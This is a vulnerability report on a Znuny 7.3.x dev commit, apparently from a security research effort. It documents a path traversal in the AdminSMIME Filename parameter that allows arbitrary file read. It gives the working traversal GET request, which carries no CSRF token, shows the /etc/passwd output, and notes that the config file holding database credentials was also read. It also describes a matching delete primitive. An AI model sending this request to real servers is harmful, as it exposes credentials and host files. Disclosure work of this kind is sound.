# VULN-026 — AdminSMIME `Filename` unconfined arbitrary file read (+CSRF) + delete

**Software**: Znuny
**Repository**: https://github.com/znuny/Znuny
**Affected version**: 7.3.x (post-7.3.7, dev branch; commit-pinned — no tagged release)
**Status**: CONFIRMED
**Severity (static)**: Medium
**Target commit**: b6c9d94c197d1b8a50c17247705ab5cc85b85e13
**Validated at**: 2026-09-29

## Preconditions
- Admin-group agent session (`root@localhost` / `ZnunyAdmin_2f8b`).
- S/MIME enabled (documented gate). The exploit enables it via SysConfig against a local,
  writable `CertPath`/`PrivatePath` and `/usr/bin/openssl`; the traversal reaches host files
  regardless of the configured base dir.

## Request
Tokenless GET (see `request.http`):
```
GET /znuny/index.pl?Action=AdminSMIME;Subaction=Download;Type=cert;Filename=../../../../../etc/passwd
Cookie: OTRSAgentInterface=<admin>
```
No `ChallengeToken` parameter is present — the Download branch never checks one.

## Response
See `response.txt`. `/etc/passwd` returned verbatim:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```
`Filename=../../../Kernel/Config.pm` returned the deployed Znuny config (DB credentials).

## Observation
Full-content read, exactly as predicted. `CertificateGet` builds `"$CertPath/$Filename"` and
`FileRead`s it with no confinement (`SMIME.pm:1281-1282`); the traversal escapes `CertPath`.
The Download branch (`AdminSMIME.pm:360`) has no `ChallengeTokenCheck` (the Delete branch at
:116 does), so the read is also CSRF-forgeable via a GET.

## Side effects
None from the read. The Delete branch (`unlink "$CertPath/$Filename"`) is a matching *write/
delete* primitive but was **not** exercised to avoid destroying host files. Idempotent.

## Research & references
- OWASP WSTG-ATHZ-01 (Directory Traversal / File Include): unconfined filename concatenation.
- OWASP CSRF Prevention Cheat Sheet: state/asset-exposing GET without an anti-CSRF token.
- CWE-22 (traversal) + CWE-352 (CSRF).

## Content-exfil scope
Full raw bytes are returned (superior to VULN-007's readability oracle). Confirmed exfil of
`/etc/passwd` and `Kernel/Config.pm` (DB credentials).
